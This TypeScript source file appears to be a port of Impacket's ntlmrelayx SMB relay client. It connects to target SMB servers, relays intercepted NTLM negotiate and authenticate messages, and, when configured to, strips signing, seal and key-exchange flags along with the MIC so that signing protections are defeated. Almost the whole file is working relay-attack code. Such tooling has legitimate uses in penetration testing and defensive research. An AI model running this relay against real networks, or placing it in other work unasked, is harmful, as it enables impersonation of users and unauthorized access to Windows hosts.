import { info, error as logError } from '@impacket/examples';
import { SMBConnection } from '@impacket/smb-connection';
import * as smb from '@impacket/smb';
import * as smb3 from '@impacket/smb3';
import * as ntlmMod from '@impacket/ntlm';
import * as spnegoMod from '@impacket/spnego';
import {
  STATUS_SUCCESS,
  STATUS_MORE_PROCESSING_REQUIRED,
  STATUS_ACCESS_DENIED,
  STATUS_LOGON_FAILURE,
} from '@impacket/nt-errors';
import type { NTLMRelayxConfig, ProtocolClientInstance } from './config.js';

let clientIdx = 0;

export class SMBRelayClient implements ProtocolClientInstance {
  static PLUGIN_NAME = 'SMB';

  serverConfig: NTLMRelayxConfig;
  targetHost: string;
  targetPort: number;
  target: URL;
  extendedSecurity: boolean;
  session: SMBConnection | null = null;
  sessionData: Record<string, any> = {};
  client_id = 0;

  private negotiateMessage: Buffer | null = null;
  private challengeMessage: Buffer | null = null;
  private serverChallenge: Buffer | null = null;
  private keepAliveHits = 1;

  constructor(
    config: NTLMRelayxConfig,
    target: URL,
    options?: { targetPort?: number; extendedSecurity?: boolean },
  ) {
    this.serverConfig = config;
    this.targetHost = target.hostname;
    this.targetPort = target.port ? Number(target.port) : (options?.targetPort ?? 445);
    this.target = target;
    this.extendedSecurity = options?.extendedSecurity ?? true;
  }

  setClientId(): void {
    this.client_id = ++clientIdx;
  }

  async keepAlive(): Promise<void> {
    if (this.keepAliveHits >= 50) {
      if (this.session) {
        try {
          const tid = await this.session.connectTree('IPC$');
          await this.session.disconnectTree(tid);
        } catch { /* ignore */ }
      }
      this.keepAliveHits = 1;
    } else {
      this.keepAliveHits++;
    }
  }

  killConnection(): void {
    if (this.session) {
      try { this.session.close(); } catch { /* ignore */ }
      this.session = null;
    }
  }

  async initConnection(): Promise<boolean> {
    try {
      this.session = new SMBConnection(this.targetHost, this.targetHost, {
        sessPort: this.targetPort,
        manualNegotiate: true,
      });

      const flags2 = this.extendedSecurity
        ? smb.FLAGS2_EXTENDED_SECURITY | smb.FLAGS2_NT_STATUS | smb.FLAGS2_LONG_NAMES
        : smb.FLAGS2_NT_STATUS | smb.FLAGS2_LONG_NAMES;

      const negoData = this.serverConfig.smb2support
        ? Buffer.from('\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00', 'latin1')
        : Buffer.from('\x02NT LM 0.12\x00', 'latin1');

      await this.session.negotiateSession(null, undefined, flags2, negoData);

      const smbServer = this.session.getSMBServer();
      if ('isSigningRequired' in smbServer && (smbServer as any).isSigningRequired()) {
        logError("Signing is required on target, relay attack won't work unless using --remove-target / --remove-mic");
      }

      return true;
    } catch (e) {
      if (!this.serverConfig.smb2support) {
        logError('SMBClient error: Connection was reset. Possibly the target has SMBv1 disabled. Try running ntlmrelayx with --smb2support');
      } else {
        logError(`SMBClient error: ${e}`);
      }
      return false;
    }
  }

  async sendNegotiate(negotiateMessage: Buffer): Promise<any> {
    const negoMessage = new ntlmMod.NTLMAuthNegotiate();
    negoMessage.fromString(negotiateMessage);

    if (this.serverConfig.remove_mic) {
      const flags = negoMessage.get('flags') as number;
      let f = flags;
      if (f & ntlmMod.NTLMSSP_NEGOTIATE_SIGN) f ^= ntlmMod.NTLMSSP_NEGOTIATE_SIGN;
      if (f & ntlmMod.NTLMSSP_NEGOTIATE_ALWAYS_SIGN) f ^= ntlmMod.NTLMSSP_NEGOTIATE_ALWAYS_SIGN;
      if (f & ntlmMod.NTLMSSP_NEGOTIATE_KEY_EXCH) f ^= ntlmMod.NTLMSSP_NEGOTIATE_KEY_EXCH;
      if (f & ntlmMod.NTLMSSP_NEGOTIATE_VERSION) f ^= ntlmMod.NTLMSSP_NEGOTIATE_VERSION;
      negoMessage.set('flags', f);
    }

    const negoData = negoMessage.getData();

    let challengeData: Buffer;
    if (this.session!.getDialect() === smb.SMB_DIALECT) {
      challengeData = await this.sendNegotiatev1(negoData);
    } else {
      challengeData = await this.sendNegotiatev2(negoData);
    }

    const challenge = new ntlmMod.NTLMAuthChallenge();
    challenge.fromString(challengeData);

    this.negotiateMessage = negoData;
    this.challengeMessage = challenge.getData();
    this.sessionData['CHALLENGE_MESSAGE'] = challenge;
    this.serverChallenge = challenge.get('challenge') as Buffer;

    return challenge;
  }

  private async sendNegotiatev2(negotiateMessage: Buffer): Promise<Buffer> {
    const v2client = this.session!.getSMBServer() as smb3.SMB3;

    const sessionSetup = new smb3.SMB2SessionSetup();
    sessionSetup.set('Flags', 0);
    sessionSetup.set('SecurityBufferLength', negotiateMessage.length);
    sessionSetup.set('Buffer', negotiateMessage);

    const packet = new smb3.SMB2Packet();
    packet.set('Command', smb3.SMB2_SESSION_SETUP);
    packet.set('Data', sessionSetup.getData());

    const packetID = await v2client.sendSMB(packet);
    const ans = await v2client.recvSMB(packetID);

    const status = ans.get('Status') as number;
    if (status !== STATUS_MORE_PROCESSING_REQUIRED && status !== STATUS_SUCCESS) {
      throw new Error(`Negotiate failed with status 0x${status.toString(16)}`);
    }

    (v2client as any)._Session = (v2client as any)._Session || {};
    (v2client as any)._Session.SessionID = ans.get('SessionID');

    const respData = new smb3.SMB2SessionSetup_Response();
    respData.fromString(ans.get('Data') as Buffer);
    return respData.get('Buffer') as Buffer;
  }

  private async sendNegotiatev1(negotiateMessage: Buffer): Promise<Buffer> {
    const v1client = this.session!.getSMBServer() as smb.SMB;

    const smbPacket = new smb.NewSMBPacket();
    smbPacket.set('Flags1', smb.FLAGS1_PATHCASELESS);
    smbPacket.set('Flags2', smb.FLAGS2_EXTENDED_SECURITY);

    const sessionSetup = new smb.SMBCommand();
    sessionSetup.command = smb.SMB_COMMAND_SESSION_SETUP;

    const params = new smb.SMBSessionSetupAndX_Extended_Parameters();
    params.set('MaxBufferSize', 65535);
    params.set('MaxMpxCount', 2);
    params.set('VcNumber', 1);
    params.set('SessionKey', 0);
    params.set('Capabilities', smb.CAP_EXTENDED_SECURITY | smb.CAP_USE_NT_ERRORS | smb.CAP_UNICODE);
    params.set('SecurityBlobLength', negotiateMessage.length);
    sessionSetup.set('Parameters', params.getData());

    const data = new smb.SMBSessionSetupAndX_Extended_Data();
    data.set('SecurityBlob', negotiateMessage);
    data.set('NativeOS', Buffer.from('Unix\x00', 'utf16le'));
    data.set('NativeLanMan', Buffer.from('Samba\x00', 'utf16le'));
    sessionSetup.set('Data', data.getData());

    smbPacket.addCommand(sessionSetup);
    await (v1client as any).sendSMB(smbPacket);
    const resp = await (v1client as any).recvSMB();

    const uid = resp.get('Uid') as number;
    (v1client as any).setUid?.(uid) ?? ((v1client as any)._uid = uid);

    const respCmd = new smb.SMBCommand();
    respCmd.fromString((resp.get('Data') as Buffer));
    const respParams = new smb.SMBSessionSetupAndX_Extended_Response_Parameters();
    respParams.fromString(respCmd.get('Parameters') as Buffer);
    const respData = new smb.SMBSessionSetupAndX_Extended_Response_Data();
    (respData as any)['SecurityBlobLength'] = respParams.get('SecurityBlobLength');
    respData.fromString(respCmd.get('Data') as Buffer);

    return respData.get('SecurityBlob') as Buffer;
  }

  async sendAuth(authenticateMessageBlob: Buffer, serverChallenge?: Buffer): Promise<[any, number]> {
    let authData = authenticateMessageBlob;

    if (this.serverConfig.remove_mic) {
      const authMessage = new ntlmMod.NTLMAuthChallengeResponse();
      authMessage.fromString(authData);
      let flags = authMessage.get('flags') as number;
      if (flags & ntlmMod.NTLMSSP_NEGOTIATE_SIGN) flags ^= ntlmMod.NTLMSSP_NEGOTIATE_SIGN;
      if (flags & ntlmMod.NTLMSSP_NEGOTIATE_ALWAYS_SIGN) flags ^= ntlmMod.NTLMSSP_NEGOTIATE_ALWAYS_SIGN;
      if (flags & ntlmMod.NTLMSSP_NEGOTIATE_KEY_EXCH) flags ^= ntlmMod.NTLMSSP_NEGOTIATE_KEY_EXCH;
      if (flags & ntlmMod.NTLMSSP_NEGOTIATE_VERSION) flags ^= ntlmMod.NTLMSSP_NEGOTIATE_VERSION;
      authMessage.set('flags', flags);
      authMessage.set('MIC', Buffer.alloc(0));
      authMessage.set('Version', Buffer.alloc(0));
      authData = authMessage.getData();
    }

    if (this.serverConfig.remove_sign_seal) {
      const authMessage = new ntlmMod.NTLMAuthChallengeResponse();
      authMessage.fromString(authData);
      let flags = authMessage.get('flags') as number;
      if (flags & ntlmMod.NTLMSSP_NEGOTIATE_SIGN) flags ^= ntlmMod.NTLMSSP_NEGOTIATE_SIGN;
      if (flags & ntlmMod.NTLMSSP_NEGOTIATE_ALWAYS_SIGN) flags ^= ntlmMod.NTLMSSP_NEGOTIATE_ALWAYS_SIGN;
      if (flags & ntlmMod.NTLMSSP_NEGOTIATE_SEAL) flags ^= ntlmMod.NTLMSSP_NEGOTIATE_SEAL;
      authData = authMessage.getData();
    }

    // Unwrap SPNEGO if present
    if (authData[0] === spnegoMod.ASN1_SUPPORTED_MECH) {
      const resp = new spnegoMod.SPNEGO_NegTokenResp();
      resp.fromString(authData);
      authData = resp.fields['ResponseToken'] as Buffer || authData;
    }

    if (this.session!.getDialect() === smb.SMB_DIALECT) {
      return this.sendAuthv1(authData);
    }
    return this.sendAuthv2(authData);
  }

  private async sendAuthv2(authData: Buffer): Promise<[any, number]> {
    const v2client = this.session!.getSMBServer() as smb3.SMB3;

    const sessionSetup = new smb3.SMB2SessionSetup();
    sessionSetup.set('Flags', 0);
    sessionSetup.set('SecurityBufferLength', authData.length);
    sessionSetup.set('Buffer', authData);

    const packet = new smb3.SMB2Packet();
    packet.set('Command', smb3.SMB2_SESSION_SETUP);
    packet.set('Data', sessionSetup.getData());

    const packetID = await v2client.sendSMB(packet);
    const resp = await v2client.recvSMB(packetID);

    return [resp, resp.get('Status') as number];
  }

  private async sendAuthv1(authData: Buffer): Promise<[any, number]> {
    const v1client = this.session!.getSMBServer() as smb.SMB;

    const smbPacket = new smb.NewSMBPacket();
    smbPacket.set('Flags1', smb.FLAGS1_PATHCASELESS);
    smbPacket.set('Flags2', smb.FLAGS2_EXTENDED_SECURITY | smb.FLAGS2_UNICODE);
    smbPacket.set('Uid', (v1client as any)._uid ?? 0);

    const sessionSetup = new smb.SMBCommand();
    sessionSetup.command = smb.SMB_COMMAND_SESSION_SETUP;

    const params = new smb.SMBSessionSetupAndX_Extended_Parameters();
    params.set('MaxBufferSize', 65535);
    params.set('MaxMpxCount', 2);
    params.set('VcNumber', 1);
    params.set('SessionKey', 0);
    params.set('Capabilities', smb.CAP_EXTENDED_SECURITY | smb.CAP_USE_NT_ERRORS | smb.CAP_UNICODE);
    params.set('SecurityBlobLength', authData.length);
    sessionSetup.set('Parameters', params.getData());

    const data = new smb.SMBSessionSetupAndX_Extended_Data();
    data.set('SecurityBlob', authData);
    data.set('NativeOS', Buffer.from('Unix\x00', 'utf16le'));
    data.set('NativeLanMan', Buffer.from('Samba\x00', 'utf16le'));
    sessionSetup.set('Data', data.getData());

    smbPacket.addCommand(sessionSetup);
    await (v1client as any).sendSMB(smbPacket);
    const resp = await (v1client as any).recvSMB();

    const errorCode =
      ((resp.get('ErrorCode') as number) << 16) |
      ((resp.get('_reserved') as number) << 8) |
      (resp.get('ErrorClass') as number);

    return [resp, errorCode];
  }

  getStandardSecurityChallenge(): Buffer | null {
    if (!this.session) return null;
    if (this.session.getDialect() === smb.SMB_DIALECT) {
      return (this.session.getSMBServer() as any).get_encryption_key?.() ?? null;
    }
    return null;
  }

  async isAdmin(): Promise<string> {
    return 'UNKNOWN';
  }
}
